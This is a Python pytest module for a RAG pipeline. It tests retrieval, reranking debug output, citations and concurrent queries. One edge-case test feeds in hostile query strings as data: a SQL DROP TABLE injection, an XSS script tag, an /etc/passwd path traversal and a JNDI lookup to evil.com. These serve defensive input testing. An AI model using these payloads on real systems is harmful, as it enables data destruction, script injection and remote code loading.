"""
Focused tests for the unified RAG pipeline - the only pipeline in production use.

This module tests the actual unified_rag_pipeline function that handles all
RAG requests in production. No testing of deprecated or unused code.
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from typing import Dict, Any

from tldw_Server_API.app.core.RAG.rag_service.unified_pipeline import unified_rag_pipeline
from tldw_Server_API.app.api.v1.schemas.rag_schemas_unified import UnifiedRAGResponse
from tldw_Server_API.app.core.RAG.rag_service.types import Document, DataSource

# ========================================================================
# Unit Tests - Minimal mocking, focus on pipeline logic
# ========================================================================

class TestUnifiedPipelineUnit:
    """Unit tests for the unified RAG pipeline."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_minimal_query_execution(self):
        """Test the most basic query execution with minimal parameters."""
        # This represents 90% of actual usage
        # Mock the dependencies that unified_rag_pipeline uses
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            # Simulate large retrieval result with Document objects
            large_docs = [
                Document(id=str(i), content=f"Doc {i}", metadata={}, source=DataSource.MEDIA_DB)
                for i in range(100)
            ]
            mock_retriever_instance.retrieve = AsyncMock(return_value=large_docs)
            mock_retriever.return_value = mock_retriever_instance

            # Call the actual function with minimal params
            result = await unified_rag_pipeline(
                query="What is RAG?",
                top_k=5
            )

            # Verify basic structure (Pydantic response)
            assert isinstance(result, UnifiedRAGResponse)
            assert result.query == "What is RAG?"

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_query_with_common_parameters(self):
        """Test query with parameters commonly used in production."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=[])
            mock_retriever.return_value = mock_retriever_instance

            result = await unified_rag_pipeline(
                query="Explain machine learning",
                top_k=10,
                enable_cache=True,
                enable_reranking=True,
                temperature=0.7
            )

            assert isinstance(result, UnifiedRAGResponse)
            assert result.query == "Explain machine learning"

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_rerank_snapshots_are_hidden_when_debug_mode_is_disabled(self):
        docs = [
            Document(id="doc-1", content="Paris is the capital of France.", metadata={}, source=DataSource.MEDIA_DB, score=0.9),
            Document(id="doc-2", content="France is in Europe.", metadata={}, source=DataSource.MEDIA_DB, score=0.8),
        ]

        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever, patch(
            'tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.create_reranker'
        ) as mock_create_reranker:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=docs)
            mock_retriever.return_value = mock_retriever_instance

            reranker = MagicMock()
            reranker.rerank = AsyncMock(return_value=list(reversed(docs)))
            mock_create_reranker.return_value = reranker

            result = await unified_rag_pipeline(
                query="What is the capital of France?",
                top_k=2,
                enable_cache=False,
                enable_reranking=True,
                enable_generation=False,
                debug_mode=False,
            )

            assert isinstance(result, UnifiedRAGResponse)
            assert "pre_rerank_documents" not in (result.metadata or {})
            assert "reranked_documents" not in (result.metadata or {})

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_rerank_snapshots_are_hidden_without_explicit_opt_in(self, monkeypatch):
        monkeypatch.delenv("RAG_INCLUDE_RERANK_DEBUG_DOCUMENTS", raising=False)
        docs = [
            Document(id="doc-1", content="Paris is the capital of France.", metadata={}, source=DataSource.MEDIA_DB, score=0.9),
            Document(id="doc-2", content="France is in Europe.", metadata={}, source=DataSource.MEDIA_DB, score=0.8),
        ]

        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever, patch(
            'tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.create_reranker'
        ) as mock_create_reranker:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=docs)
            mock_retriever.return_value = mock_retriever_instance

            reranker = MagicMock()
            reranker.rerank = AsyncMock(return_value=list(reversed(docs)))
            mock_create_reranker.return_value = reranker

            result = await unified_rag_pipeline(
                query="What is the capital of France?",
                top_k=2,
                enable_cache=False,
                enable_reranking=True,
                enable_generation=False,
                debug_mode=True,
            )

            assert isinstance(result, UnifiedRAGResponse)
            assert "pre_rerank_documents" not in (result.metadata or {})
            assert "reranked_documents" not in (result.metadata or {})

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_rerank_snapshots_include_truncated_content_when_explicitly_enabled(self, monkeypatch):
        monkeypatch.delenv("RAG_INCLUDE_RERANK_DEBUG_DOCUMENTS", raising=False)
        docs = [
            Document(
                id="doc-1",
                content="Paris is the capital of France. " * 60,
                metadata={"media_id": "media-1"},
                source=DataSource.MEDIA_DB,
                score=0.9,
            ),
            Document(
                id="doc-2",
                content="France is in Europe.",
                metadata={"media_id": "media-2"},
                source=DataSource.MEDIA_DB,
                score=0.8,
            ),
        ]

        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever, patch(
            'tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.create_reranker'
        ) as mock_create_reranker:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=docs)
            mock_retriever.return_value = mock_retriever_instance

            reranker = MagicMock()
            reranker.rerank = AsyncMock(return_value=list(reversed(docs)))
            mock_create_reranker.return_value = reranker

            result = await unified_rag_pipeline(
                query="What is the capital of France?",
                top_k=2,
                enable_cache=False,
                enable_reranking=True,
                enable_generation=False,
                debug_mode=True,
                include_rerank_debug_documents=True,
            )

            assert isinstance(result, UnifiedRAGResponse)
            assert result.metadata["pre_rerank_documents"][0]["content"].startswith("Paris is the capital of France.")
            assert len(result.metadata["pre_rerank_documents"][0]["content"]) < len(docs[0].content)
            assert result.metadata["pre_rerank_documents"][0]["metadata"]["media_id"] == "media-1"
            assert "reranked_documents" in result.metadata

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_citations_generation(self):
        """Citations should populate academic and chunk-level fields when enabled."""
        # Create two simple documents with metadata sufficient for academic formatting
        from tldw_Server_API.app.core.RAG.rag_service.types import Document, DataSource
        docs = [
            Document(
                id="doc1",
                content="Machine learning is a subset of AI. It learns from data.",
                metadata={
                    "author": "Smith, J.",
                    "title": "Introduction to Machine Learning",
                    "publication": "Tech Publications",
                    "date": "2024",
                    "pages": "12-34",
                },
                source=DataSource.MEDIA_DB,
                score=0.9,
            ),
            Document(
                id="doc2",
                content="Neural networks are models used in machine learning.",
                metadata={
                    "author": "Doe, A.",
                    "title": "Neural Networks Basics",
                    "publication": "AI Journal",
                    "date": "2023",
                    "pages": "101-110",
                },
                source=DataSource.MEDIA_DB,
                score=0.8,
            ),
        ]

        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=docs)
            mock_retriever.return_value = mock_retriever_instance

            result = await unified_rag_pipeline(
                query="machine learning",
                top_k=2,
                enable_citations=True,
                citation_style="apa",
            )

            assert isinstance(result, UnifiedRAGResponse)
            # Academic citations should be present
            assert isinstance(result.academic_citations, list)
            assert len(result.academic_citations) >= 1
            # Chunk citations should also be present by default
            assert isinstance(result.chunk_citations, list)
            assert len(result.chunk_citations) >= 1

    # Note: Retrieval-time enhanced chunking removed from unified pipeline

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_empty_query_handling(self):
        """Test handling of empty or invalid queries."""
        # Empty query should be handled gracefully
        result = await unified_rag_pipeline(query="")

        assert isinstance(result, UnifiedRAGResponse)
        # Should handle empty query without crashing
        assert result.query == ""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_sources_parameter(self):
        """Test different data source configurations."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=[])
            mock_retriever.return_value = mock_retriever_instance

            # Test with specific sources
            result = await unified_rag_pipeline(
                query="test query",
                sources=["media_db", "notes"]
            )

            assert isinstance(result, UnifiedRAGResponse)

# ========================================================================
# Integration Tests - No mocking, use real MediaDatabase
# ========================================================================

class TestUnifiedPipelineIntegration:
    """Integration tests using real components."""

    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_pipeline_with_real_database(self, populated_media_db):
        """Test pipeline with actual MediaDatabase."""
        # Pass the real database to the pipeline
        result = await unified_rag_pipeline(
            query="What is RAG?",
            sources=["media_db"],
            top_k=5,
            # Pass the database instance if the pipeline accepts it
            # database=populated_media_db
        )

        assert isinstance(result, UnifiedRAGResponse)
        assert result.query is not None

    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_end_to_end_retrieval(self, populated_media_db):
        """Test complete retrieval flow with real database."""
        result = await unified_rag_pipeline(
            query="vector databases",
            sources=["media_db"],
            top_k=10
        )

        assert isinstance(result, UnifiedRAGResponse)
        # Check if documents were retrieved (list of dicts)
        assert isinstance(result.documents, list)

    @pytest.mark.integration
    @pytest.mark.asyncio
    @pytest.mark.slow
    async def test_concurrent_requests(self, populated_media_db):
        """Test handling multiple concurrent requests."""
        import asyncio

        queries = ["RAG", "vector", "retrieval", "generation", "database"]

        # Create concurrent tasks
        tasks = [
            unified_rag_pipeline(query=q, sources=["media_db"], top_k=5)
            for q in queries
        ]

        # Execute concurrently
        results = await asyncio.gather(*tasks)

        assert len(results) == len(queries)
        for result in results:
            assert isinstance(result, UnifiedRAGResponse)

# ========================================================================
# Common Production Scenarios
# ========================================================================

class TestProductionScenarios:
    """Test scenarios that reflect actual production usage."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_chatbot_query_pattern(self):
        """Test typical chatbot interaction pattern."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=[])
            mock_retriever.return_value = mock_retriever_instance

            result = await unified_rag_pipeline(
                query="Follow up on the previous question",
                sources=["media_db", "chats"],
                top_k=5,
                temperature=0.7,
                user_id="test_user_123"
            )

            assert isinstance(result, UnifiedRAGResponse)

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_research_query_pattern(self):
        """Test research/analysis query pattern."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=[])
            mock_retriever.return_value = mock_retriever_instance

            result = await unified_rag_pipeline(
                query="What are the latest developments in RAG systems?",
                sources=["media_db", "notes"],
                top_k=20,
                enable_citations=True,
                enable_reranking=True,
                min_relevance_score=0.7
            )

            assert isinstance(result, UnifiedRAGResponse)

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_api_endpoint_pattern(self):
        """Test pattern used by API endpoints."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=[])
            mock_retriever.return_value = mock_retriever_instance

            # Simulate API request parameters
            api_request = {
                "query": "User question from API",
                "top_k": 10,
                "user_id": "api_user_123"
            }

            result = await unified_rag_pipeline(**api_request)

            assert isinstance(result, UnifiedRAGResponse)

# ========================================================================
# Performance and Edge Cases
# ========================================================================

class TestPerformanceAndEdgeCases:
    """Test performance characteristics and edge cases."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_large_result_set_handling(self):
        """Test handling of large number of retrieved documents."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            # Simulate large retrieval result with Document objects
            large_docs = [
                Document(id=str(i), content=f"Doc {i}", metadata={}, source=DataSource.MEDIA_DB)
                for i in range(100)
            ]
            mock_retriever_instance.retrieve = AsyncMock(return_value=large_docs)
            mock_retriever.return_value = mock_retriever_instance

            result = await unified_rag_pipeline(
                query="broad search query",
                top_k=100
            )

            assert isinstance(result, UnifiedRAGResponse)

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_special_characters_in_query(self):
        """Test handling of special characters and injection attempts."""
        dangerous_queries = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com}"
        ]

        for query in dangerous_queries:
            # Should handle safely without throwing exceptions
            result = await unified_rag_pipeline(query=query)
            assert isinstance(result, UnifiedRAGResponse)
            assert result.query == query

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_various_parameter_combinations(self):
        """Test various parameter combinations used in production."""
        test_cases = [
            # Minimal
            {"query": "test"},
            # With sources
            {"query": "test", "sources": ["media_db"]},
            # With retrieval params
            {"query": "test", "top_k": 20, "min_relevance_score": 0.5},
            # With generation params
            {"query": "test", "temperature": 0.9, "max_tokens": 500},
            # With features
            {"query": "test", "enable_cache": True, "enable_reranking": True},
            # With all
            {
                "query": "test",
                "sources": ["media_db", "notes"],
                "top_k": 15,
                "temperature": 0.7,
                "enable_cache": True,
                "enable_reranking": True,
                "enable_citations": True
            }
        ]

        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve = AsyncMock(return_value=[])
            mock_retriever.return_value = mock_retriever_instance

            for params in test_cases:
                result = await unified_rag_pipeline(**params)
                assert isinstance(result, UnifiedRAGResponse)
                assert result.query is not None
